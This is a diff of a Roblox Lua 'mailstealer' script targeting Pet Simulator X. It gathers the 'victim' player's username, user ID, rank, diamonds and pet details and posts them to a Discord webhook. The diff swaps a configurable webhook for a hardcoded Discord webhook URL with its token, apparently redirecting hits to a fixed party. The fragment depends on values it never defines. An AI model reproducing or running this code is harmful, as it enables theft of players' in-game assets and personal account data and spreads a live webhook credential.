@@ -1,16 +1,17 @@
 if game.PlaceId == 6284583030 then
-	_G.GameIn = "Pet Simulator X"
+    _G.GameIn = "Pet Simulator X"
 elseif game.PlaceId == 7722306047 then
-	_G.GameIn = "PSX Trading Plaza"
+    _G.GameIn = "PSX Trading Plaza"
 elseif game.PlaceId == 10321372166 then
-	_G.GameIn = "PSX Hardcore"
+    _G.GameIn = "PSX Hardcore"
 elseif game.PlaceId == 12610002282 then
-	_G.GameIn = "PSX Pro Trading Plaza"
+    _G.GameIn = "PSX Pro Trading Plaza"
 elseif game.PlaceId == 11725212117 then
-	_G.GameIn = "PSX Voice Trading Plaza"
+    _G.GameIn = "PSX Voice Trading Plaza"
 else
-	_G.GameIn = "❓ Couldn't find game"
+    _G.GameIn = "❓ Couldn't find game"
 end
+
 local webhookcolor = "13369599"
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
@@ -18,34 +19,42 @@ _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 _G.PetName = v2.name
 _G.PetRar = v2.rarity
-
-local function sendwebhook(msg)
-local msg = {
-  ["content"]= "|| @everyone || **Hostee Mailstealer has detected a new hit!**",
-  ["embeds"]= {
-    {
-      ["title"]= "`Hostee Mailstealer Results`",
-      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
-      ["url"]= "https://discord.gg/hosteehub",
-      ["color"]= ""..webhookcolor.."",
-      ["fields"]= {
-        {
-          ["name"]= "Diamonds 💎",
-          ["value"]= "```".._G.Diamonds.."```",
-          ["inline"]= true
+local function sendwebhook()
+    local msg = {
+        ["content"] = "|| @everyone ||**Hello ".._G.UserName..", Hostee Scriptz Mailstealer has detected a new hit!**",
+        ["embeds"] = {
+            {
+                ["title"] = "Hostee Scriptz Mailstealer Results",
+                ["description"] = "**Data from the victim**\n🧑Display Name: " .. _G.PlrDisplayNameVictim .. "\n🧑Username: " .. _G.PlrUserVictim .. "\n🧑User ID: " .. _G.PlrUserIDVictim .. "\n🐱Rank: " .. _G.CurrentRank .. "\n🎮Place: " .. _G.GameIn .. "",
+                ["url"] = "https://discord.gg/rizzhub",
+                ["color"] = webhookcolor,
+                ["fields"] = {
+                    {
+                        ["name"] = "Diamonds 💎",
+                        ["value"] = "```" .. _G.Diamonds .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Pet Name & Rarity",
+                        ["value"] = "```Pet Name: " .. _G.PetName .. "\nPet Rarity: " .. _G.PetRar .. "```",
+                        ["inline"] = true
+                    }
+                }
+            }
         },
-        {
-          ["name"]= "Pet Name & Rarity",
-          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
-		  ["inline"]= true
-        }
-      }
+        ["attachments"] = {}
     }
-  },
-  ["attachments"] = {}
-}
-local Webhook = _G.Webhook
-request = http_request or request or HttpPost or syn.request
-request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+    
+    local Webhook = "https://discord.com/api/webhooks/1114164888147861534/2pnRiDU0gcz60oWnVlycPWUce7uuaZtcuAAEu6K9dMxcY4SLyehxhGDwmJwaptI74q2e"
+    local request = http_request or request or HttpPost or syn.request
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game.HttpService:JSONEncode(msg)
+    })
 end
+
 sendwebhook(msg)
